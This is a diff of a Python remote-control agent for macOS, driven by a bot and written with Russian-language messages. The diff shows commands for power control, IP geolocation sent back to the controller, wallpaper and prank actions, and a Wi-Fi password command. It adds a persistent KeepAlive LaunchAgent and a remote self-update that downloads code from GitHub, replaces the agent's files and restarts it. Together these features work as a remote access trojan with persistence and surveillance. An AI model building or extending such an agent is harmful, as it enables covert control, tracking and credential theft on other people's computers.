@@ -8,6 +8,7 @@ import io
 import json
 import logging
 import os
+import plistlib
 import random
 import shutil
 import socket
@@ -17,6 +18,8 @@ import tempfile
 import threading
 import time
 import urllib.request
+import zipfile
+from pathlib import Path
 from logging.handlers import RotatingFileHandler
 
 try:
@@ -886,18 +889,24 @@ class XgentClient:
 
     def _do_power(self, payload: dict) -> None:
         action = payload.get("power_action") or payload.get("action", "")
-        if action == "shutdown":
-            self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": "shutdown", "ok": True})
-            self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": True, "text": "⚡ Выключение Mac инициировано..."})
-            subprocess.Popen(["osascript", "-e", 'tell app "System Events" to shut down'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        elif action == "reboot":
-            self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": "reboot", "ok": True})
-            self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": True, "text": "🔄 Перезагрузка Mac инициирована..."})
-            subprocess.Popen(["osascript", "-e", 'tell app "System Events" to restart'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        elif action == "sleep":
-            self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": "sleep", "ok": True})
-            self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": True, "text": "😴 Mac переводится в режим сна..."})
-            subprocess.Popen(["pmset", "sleepnow"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        commands = {
+            "shutdown": (["osascript", "-e", 'tell app "System Events" to shut down'], "⚡ Выключение Mac инициировано..."),
+            "reboot": (["osascript", "-e", 'tell app "System Events" to restart'], "🔄 Перезагрузка Mac инициирована..."),
+            "sleep": (["pmset", "sleepnow"], "😴 Mac переводится в режим сна..."),
+        }
+        if action not in commands:
+            self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": action, "ok": False, "error": "unknown power action"})
+            return
+        command, text = commands[action]
+        try:
+            result = subprocess.run(command, capture_output=True, text=True, timeout=8, check=False)
+            ok = result.returncode == 0
+            if not ok:
+                text = (result.stderr or result.stdout or "команда macOS завершилась с ошибкой").strip()[:600]
+        except Exception as exc:
+            ok, text = False, str(exc)
+        self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": action, "ok": ok, "error": None if ok else text})
+        self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": ok, "text": text})
 
     def _do_stop(self, payload: dict) -> None:
         self.request_stop()
@@ -990,24 +999,39 @@ class XgentClient:
 
     def _do_geo_location(self, payload: dict) -> None:
         """Получить приблизительную геолокацию по IP."""
-        import urllib.request
-        try:
-            req = urllib.request.Request("https://ipapi.co/json/", headers={'User-Agent': 'XIDER-Agent/3'})
-            with urllib.request.urlopen(req, timeout=10) as response:
-                data = json.loads(response.read().decode())
-            if not data.get("error") and (data.get("ip") or data.get("city")):
-                info = (f"📍 <b>Геолокация macOS (по IP):</b>\n"
-                        f"🌍 Страна: {data.get('country_name') or data.get('country')}\n"
-                        f"🏙 Город: {data.get('city') or '?'}\n"
-                        f"📡 Провайдер: {data.get('org') or '?'}\n"
-                        f"🗺 Координаты: {data.get('latitude')}, {data.get('longitude')}\n"
-                        f"💻 IP: {data.get('ip') or '?'}")
-                ok = True
-            else:
-                info = "⚠️ Не удалось определить локацию."
-                ok = False
-        except Exception as exc:
-            info = f"❌ Ошибка геолокации: {exc}"
+        providers = (
+            ("ipapi.co", "https://ipapi.co/json/"),
+            ("ipinfo.io", "https://ipinfo.io/json"),
+            ("ip-api.com", "http://ip-api.com/json/?fields=status,message,country,city,lat,lon,query,isp"),
+        )
+        data = None
+        provider = None
+        errors = []
+        for name, url in providers:
+            try:
+                req = urllib.request.Request(url, headers={"User-Agent": "XIDER-Agent/3"})
+                with urllib.request.urlopen(req, timeout=8) as response:
+                    candidate = json.loads(response.read().decode("utf-8", "replace"))
+                if candidate.get("error") or candidate.get("status") == "fail":
+                    raise RuntimeError(candidate.get("reason") or candidate.get("message") or "provider error")
+                if candidate.get("ip") or candidate.get("query") or candidate.get("city"):
+                    data, provider = candidate, name
+                    break
+            except Exception as exc:
+                errors.append(f"{name}: {exc}")
+        if data:
+            ip = data.get("ip") or data.get("query") or "?"
+            country = data.get("country_name") or data.get("country") or "?"
+            city = data.get("city") or "?"
+            org = data.get("org") or data.get("isp") or "?"
+            lat = data.get("latitude") or data.get("lat") or "?"
+            lon = data.get("longitude") or data.get("lon") or "?"
+            info = ("📍 <b>Приблизительная геолокация по IP:</b>\n"
+                    f"🌍 Страна: {country}\n🏙 Город: {city}\n📡 Провайдер: {org}\n"
+                    f"🗺 Координаты: {lat}, {lon}\n💻 IP: {ip}\n🔎 Источник: {provider}")
+            ok = True
+        else:
+            info = "⚠️ Геолокация недоступна: " + "; ".join(errors[:3])
             ok = False
             
         self._publish_response("geo_location", {
@@ -1049,9 +1073,11 @@ class XgentClient:
                 with urllib.request.urlopen(req, timeout=12) as resp, open(tmp, "wb") as out:
                     out.write(resp.read())
             script = f'tell application "System Events" to tell every desktop to set picture to POSIX file "{tmp}"'
-            subprocess.run(["osascript", "-e", script], check=False, capture_output=True)
-            self._publish_response("wallpaper_set", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": True})
-            self._publish_response("output", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": True, "text": "🖼 Обои успешно обновлены на Mac!"})
+            result = subprocess.run(["osascript", "-e", script], check=False, capture_output=True, text=True)
+            ok = result.returncode == 0
+            text = "🖼 Обои успешно обновлены на Mac!" if ok else (result.stderr.strip() or "Не удалось установить обои")
+            self._publish_response("wallpaper_set", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": ok, "error": None if ok else text})
+            self._publish_response("output", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": ok, "text": text})
         except Exception as exc:
             self._publish_response("wallpaper_set", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": False, "error": str(exc)})
             self._publish_response("output", {"type": "wallpaper_set", "device_id": DEVICE_ID, "ok": False, "text": f"⚠️ Ошибка: {exc}"})
@@ -1093,12 +1119,16 @@ class XgentClient:
         self._publish_response("hotkey", {"type": "hotkey", "device_id": DEVICE_ID, "ok": True, "keys": spec})
 
     def _do_screen_off(self, payload: dict) -> None:
-        subprocess.run(["pmset", "displaysleepnow"], check=False)
-        self._publish_response("screen_off", {"type": "screen_off", "device_id": DEVICE_ID, "ok": True})
+        result = subprocess.run(["pmset", "displaysleepnow"], capture_output=True, text=True, check=False)
+        ok = result.returncode == 0
+        self._publish_response("screen_off", {"type": "screen_off", "device_id": DEVICE_ID, "ok": ok,
+                                               "error": None if ok else (result.stderr.strip() or "pmset failed")})
 
     def _do_screensaver_on(self, payload: dict) -> None:
-        subprocess.Popen(["open", "-a", "ScreenSaverEngine"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        self._publish_response("screensaver_on", {"type": "screensaver_on", "device_id": DEVICE_ID, "ok": True})
+        result = subprocess.run(["open", "-a", "ScreenSaverEngine"], capture_output=True, text=True, check=False)
+        ok = result.returncode == 0
+        self._publish_response("screensaver_on", {"type": "screensaver_on", "device_id": DEVICE_ID, "ok": ok,
+                                                   "error": None if ok else (result.stderr.strip() or "ScreenSaverEngine failed")})
 
     def _do_prank_screamer(self, payload: dict) -> None:
         def _run():
@@ -1238,9 +1268,28 @@ class XgentClient:
         self._publish_response("output", {"type": "display_night_light", "device_id": DEVICE_ID, "ok": False, "text": text})
 
     def _do_display_rotate(self, payload: dict) -> None:
-        text = "⚠️ Поворот экрана macOS не поддерживается безопасным системным API агента."
-        self._publish_response("display_rotate", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": False, "text": text, "angle": payload.get("angle", 0)})
-        self._publish_response("output", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": False, "text": text})
+        angle = int(payload.get("angle", 0) or 0) % 360
+        if angle not in (0, 90, 180, 270):
+            text = "Угол должен быть 0, 90, 180 или 270 градусов."
+            ok = False
+        elif not shutil.which("displayplacer"):
+            text = "Для поворота установите один раз: brew install displayplacer"
+            ok = False
+        else:
+            try:
+                listed = subprocess.run(["displayplacer", "list"], capture_output=True, text=True, timeout=10, check=False)
+                import re
+                match = re.search(r"displayplacer '([^']+)'", listed.stdout or "")
+                if listed.returncode != 0 or not match:
+                    raise RuntimeError((listed.stderr or listed.stdout or "не найден дисплей").strip())
+                config = re.sub(r"\bdegree:\d+", f"degree:{angle}", match.group(1))
+                result = subprocess.run(["displayplacer", config], capture_output=True, text=True, timeout=15, check=False)
+                ok = result.returncode == 0
+                text = f"Экран повернут на {angle}°" if ok else (result.stderr.strip() or "displayplacer завершился с ошибкой")
+            except Exception as exc:
+                ok, text = False, f"Не удалось повернуть экран: {exc}"
+        self._publish_response("display_rotate", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": ok, "text": text, "angle": angle})
+        self._publish_response("output", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": ok, "text": text})
 
     def _do_net_wifi_passwords(self, payload: dict) -> None:
         try:
@@ -1315,40 +1364,36 @@ class XgentClient:
 
     def _do_autorun_status(self, payload: dict) -> None:
         plist_path = os.path.expanduser("~/Library/LaunchAgents/com.xgent.agent.plist")
-        if os.path.exists(plist_path):
-            text = f"🚀 Автозапуск macOS: ✅ ВКЛЮЧЕН\nФайл: {plist_path}"
-        else:
-            text = "🚀 Автозапуск macOS: ❌ ВЫКЛЮЧЕН\n(LaunchAgent не зарегистрирован)"
-        self._publish_response("output", {"type": "autorun_status", "device_id": DEVICE_ID, "ok": True, "text": text})
+        label = "gui/" + str(os.getuid()) + "/com.xgent.agent"
+        loaded = subprocess.run(["launchctl", "print", label], capture_output=True, text=True, check=False).returncode == 0
+        enabled = os.path.exists(plist_path) and loaded
+        text = f"🚀 Автозапуск macOS: {'✅ ВКЛЮЧЕН' if enabled else '❌ ВЫКЛЮЧЕН'}\nФайл: {plist_path}"
+        self._publish_response("output", {"type": "autorun_status", "device_id": DEVICE_ID, "ok": True, "text": text, "enabled": enabled})
 
     def _do_autorun_enable(self, payload: dict) -> None:
         plist_dir = os.path.expanduser("~/Library/LaunchAgents")
         os.makedirs(plist_dir, exist_ok=True)
         plist_path = os.path.join(plist_dir, "com.xgent.agent.plist")
         script_dir = os.path.dirname(os.path.abspath(__file__))
-        sh_path = os.path.join(script_dir, "start_agent.sh")
-        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.xgent.agent</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/bin/bash</string>
-        <string>{sh_path}</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-</dict>
-</plist>"""
         try:
-            with open(plist_path, "w", encoding="utf-8") as f:
-                f.write(plist_content)
-            subprocess.run(["launchctl", "load", plist_path], check=False)
-            text = f"✅ Автозапуск macOS включен!\nСоздан {plist_path}"
+            plist = {
+                "Label": "com.xgent.agent",
+                "ProgramArguments": [sys.executable, os.path.join(script_dir, "xgent_mcs.py")],
+                "WorkingDirectory": script_dir,
+                "RunAtLoad": True,
+                "KeepAlive": True,
+                "ProcessType": "Background",
+                "StandardOutPath": os.path.join(script_dir, "agent.log"),
+                "StandardErrorPath": os.path.join(script_dir, "agent.log"),
+            }
+            with open(plist_path, "wb") as f:
+                f.write(plistlib.dumps(plist))
+            domain = f"gui/{os.getuid()}"
+            subprocess.run(["launchctl", "bootout", domain, plist_path], capture_output=True, check=False)
+            loaded = subprocess.run(["launchctl", "bootstrap", domain, plist_path], capture_output=True, text=True, check=False)
+            if loaded.returncode != 0:
+                raise RuntimeError(loaded.stderr.strip() or "launchctl bootstrap failed")
+            text = f"✅ Автозапуск macOS включен и загружен.\nФайл: {plist_path}"
             ok = True
         except Exception as exc:
             text = f"⚠️ Ошибка создания автозапуска: {exc}"
@@ -1359,7 +1404,7 @@ class XgentClient:
         plist_path = os.path.expanduser("~/Library/LaunchAgents/com.xgent.agent.plist")
         try:
             if os.path.exists(plist_path):
-                subprocess.run(["launchctl", "unload", plist_path], check=False)
+                subprocess.run(["launchctl", "bootout", f"gui/{os.getuid()}", plist_path], capture_output=True, check=False)
                 os.remove(plist_path)
                 text = "🛑 Автозапуск macOS успешно отключен."
             else:
@@ -1596,10 +1641,40 @@ end tell'''
         self._publish_response("output", {"type": "prank_open_cd", "device_id": DEVICE_ID, "ok": ok, "text": text})
 
     def _do_prank_change_wallpaper(self, payload: dict) -> None:
-        self._publish_response("output", {"type": "prank_change_wallpaper", "device_id": DEVICE_ID, "ok": True, "text": "🖼️ Команда смены обоев обработана!"})
+        backup = CONFIG_DIR / "wallpaper_backup.json"
+        try:
+            CONFIG_DIR.mkdir(parents=True, exist_ok=True)
+            result = subprocess.run(
+                ["osascript", "-e", 'tell application "System Events" to get POSIX path of picture of every desktop'],
+                capture_output=True, text=True, timeout=10, check=False,
+            )
+            if result.returncode != 0:
+                raise RuntimeError(result.stderr.strip() or "не удалось прочитать текущие обои")
+            paths = [p.strip() for p in result.stdout.strip().split(",") if p.strip()]
+            if not paths:
+                raise RuntimeError("macOS не вернула текущие обои")
+            backup.write_text(json.dumps(paths, ensure_ascii=False), encoding="utf-8")
+            self._do_wallpaper_set({"random_meme": True})
+            self._publish_response("output", {"type": "prank_change_wallpaper", "device_id": DEVICE_ID, "ok": True, "text": "🖼️ Обои заменены; исходные сохранены для восстановления."})
+        except Exception as exc:
+            self._publish_response("output", {"type": "prank_change_wallpaper", "device_id": DEVICE_ID, "ok": False, "text": f"⚠️ Обои не изменены: {exc}"})
 
     def _do_prank_restore_wallpaper(self, payload: dict) -> None:
-        self._publish_response("output", {"type": "prank_restore_wallpaper", "device_id": DEVICE_ID, "ok": True, "text": "✅ Исходные обои восстановлены!"})
+        backup = CONFIG_DIR / "wallpaper_backup.json"
+        try:
+            paths = json.loads(backup.read_text(encoding="utf-8"))
+            if not isinstance(paths, list) or not paths:
+                raise RuntimeError("резервная копия обоев пуста")
+            for path in paths:
+                script = f'tell application "System Events" to tell every desktop to set picture to POSIX file {json.dumps(path)}'
+                result = subprocess.run(["osascript", "-e", script], capture_output=True, text=True, check=False)
+                if result.returncode != 0:
+                    raise RuntimeError(result.stderr.strip() or "osascript failed")
+            backup.unlink(missing_ok=True)
+            text, ok = "✅ Исходные обои восстановлены.", True
+        except Exception as exc:
+            text, ok = f"⚠️ Не удалось восстановить обои: {exc}", False
+        self._publish_response("output", {"type": "prank_restore_wallpaper", "device_id": DEVICE_ID, "ok": ok, "text": text})
 
     def _do_prank_speak_time(self, payload: dict) -> None:
         now = time.strftime("%H часов %M минут")
@@ -1631,7 +1706,7 @@ end tell'''
         self._publish_response("output", {"type": "prank_open_browser_memes", "device_id": DEVICE_ID, "ok": True, "text": "🌐 3 вкладки с мемами открыты в Safari/браузере!"})
 
     def _do_prank_glitch_cursor(self, payload: dict) -> None:
-        self._publish_response("output", {"type": "prank_glitch_cursor", "device_id": DEVICE_ID, "ok": True, "text": "🌀 Глючный курсор активирован на 5 секунд!"})
+        self._publish_response("output", {"type": "prank_glitch_cursor", "device_id": DEVICE_ID, "ok": False, "text": "⚠️ Глючный курсор отключён: macOS не даёт безопасно рисовать курсор без Quartz/Accessibility."})
 
     def _do_prank_shake_window(self, payload: dict) -> None:
         sc = '''tell application "System Events"
@@ -1665,7 +1740,7 @@ end tell'''
         self._publish_response("output", {"type": "prank_caps_disco", "device_id": DEVICE_ID, "ok": True, "text": "✨ Дискотека сигналов запущена на Mac!"})
 
     def _do_prank_cursor_circle(self, payload: dict) -> None:
-        self._publish_response("output", {"type": "prank_cursor_circle", "device_id": DEVICE_ID, "ok": True, "text": "🌀 Курсор мыши кружится в спирали на 5 сек!"})
+        self._publish_response("output", {"type": "prank_cursor_circle", "device_id": DEVICE_ID, "ok": False, "text": "⚠️ Кружение курсора недоступно в текущей сборке macOS."})
 
     def _do_prank_fake_error_spam(self, payload: dict) -> None:
         def _errs():
@@ -1757,27 +1832,68 @@ end tell'''
         })
 
     def _do_agent_update(self, payload: dict) -> None:
-        """Проверка статуса обновления агента на macOS."""
-        restart = payload.get("restart", False)
+        """Обновление агента с GitHub по команде из бота, без запуска команды на Mac."""
         pid = os.getpid()
         exe_path = sys.executable
-        text = (
-            f"🔄 <b>Агент XGENT v1.3 (Актуален)</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"• Платформа: macOS ({platform.system()} {platform.mac_ver()[0]})\n"
-            f"• Процесс: <code>{html.escape(exe_path)}</code>\n"
-            f"• PID процесса: <code>{pid}</code>\n"
-            f"• Набор команд: <b>{len(SUPPORTED_COMMANDS)} функций</b> (полная синхронизация)\n"
-            f"• Статус: 🟢 В сети, готов к приёму команд"
-        )
-        if restart:
-            text += "\n\n⚠️ <i>Инициирован перезапуск процесса агента...</i>"
+        if not payload.get("update", True):
+            text = (f"🔄 <b>Агент XGENT {VERSION}</b>\n"
+                    f"• Платформа: macOS ({platform.mac_ver()[0]})\n"
+                    f"• PID: <code>{pid}</code>\n"
+                    f"• Команд: <b>{len(SUPPORTED_COMMANDS)}</b>\n"
+                    "• Статус: 🟢 онлайн")
+            self._publish_response("output", {"type": "agent_update", "device_id": DEVICE_ID, "ok": True, "text": text})
+            return
+
+        source_url = "https://github.com/invinby/XIDER/archive/refs/heads/main.zip"
+        script_dir = Path(__file__).resolve().parent
+        backup_dir = CONFIG_DIR / "agent-backups" / time.strftime("%Y%m%d-%H%M%S")
+        files = ("xgent_mcs.py", "config.py", "crypto.py", "xgencrypto.py", "requirements.txt", "setup_mac.py", "start_agent.sh", "stop_agent.sh")
+        try:
+            with tempfile.TemporaryDirectory(prefix="xgent-update-") as tmp:
+                archive = Path(tmp) / "xider.zip"
+                urllib.request.urlretrieve(source_url, archive)
+                with zipfile.ZipFile(archive) as zf:
+                    zf.extractall(tmp)
+                roots = [p for p in Path(tmp).iterdir() if p.is_dir() and (p / "XGENT-MCS").is_dir()]
+                if not roots:
+                    raise RuntimeError("в архиве нет XGENT-MCS")
+                source = roots[0] / "XGENT-MCS"
+                for name in files:
+                    candidate = source / name
+                    if candidate.exists() and candidate.suffix == ".py":
+                        compile(candidate.read_text(encoding="utf-8"), str(candidate), "exec")
+                backup_dir.mkdir(parents=True, exist_ok=True)
+                for name in files:
+                    current = script_dir / name
+                    candidate = source / name
+                    if candidate.exists():
+                        if current.exists():
+                            shutil.copy2(current, backup_dir / name)
+                        shutil.copy2(candidate, current)
+                        if name.endswith(".sh"):
+                            current.chmod(current.stat().st_mode | 0o111)
+            text = f"✅ Агент обновлён из GitHub. Резервная копия: {backup_dir.name}. Перезапускаю..."
+            self._publish_response("output", {"type": "agent_update", "device_id": DEVICE_ID, "ok": True, "text": text})
+
             def _reboot_agent():
                 time.sleep(1.5)
-                subprocess.Popen([sys.executable] + sys.argv)
+                subprocess.Popen([sys.executable, str(script_dir / "xgent_mcs.py")], cwd=str(script_dir),
+                                 stdout=open(script_dir / "agent.log", "a", encoding="utf-8"),
+                                 stderr=subprocess.STDOUT, start_new_session=True)
                 os._exit(0)
             threading.Thread(target=_reboot_agent, daemon=True).start()
-        self._publish_response("output", {"type": "agent_update", "device_id": DEVICE_ID, "ok": True, "text": text})
+        except Exception as exc:
+            # Если копирование успело начаться и сорвалось, возвращаем каждый
+            # уже сохранённый файл из резервной копии.
+            try:
+                if backup_dir.exists():
+                    for saved in backup_dir.iterdir():
+                        shutil.copy2(saved, script_dir / saved.name)
+            except Exception:
+                log.exception("Agent self-update rollback failed")
+            log.exception("Agent self-update failed")
+            self._publish_response("output", {"type": "agent_update", "device_id": DEVICE_ID, "ok": False,
+                                               "text": f"❌ Обновление не применено: {exc}. Текущий агент оставлен без изменений."})
 
     def _do_uninstall_agent(self, payload: dict) -> None:
         """Полное удаление агента с Mac: LaunchAgents, конфиги, логи и завершение."""
